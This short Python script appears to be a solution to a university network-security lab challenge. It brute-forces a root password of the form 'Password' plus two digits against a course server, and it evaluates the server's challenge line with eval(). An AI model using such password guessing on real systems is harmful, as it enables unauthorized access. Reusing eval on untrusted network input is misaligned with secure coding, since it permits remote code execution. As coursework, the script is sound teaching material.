# Challenge 02

#!/usr/bin/env python3
import socket
from base64 import b64encode, b64decode

HOST = 'netsec.net.in.tum.de'   
PORT = 20002                     


def login(credentials):

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((HOST, PORT))
    sf = s.makefile("rw")  # we use a file abstraction for the sockets
    print("Trying with: ", credentials)
    sf.write("{}\n".format(credentials))
    sf.flush()

    challenge = sf.readline().rstrip('\n')


    response = eval(challenge)
    sf.write("{}\n".format(response))
    sf.flush()

    data = sf.readline().rstrip('\n')

    data = sf.readline().rstrip('\n')
    if(len(data)!= 0):
        print("From Server: received {} bytes".format(len(data)))
        print(data)
        return True

    sf.close()
    s.close()


# Loop untill find an answer

from random import randrange

while True:
    credential = "root,Password"+str(randrange(100)).zfill(2)
    if (login(credential)):
        break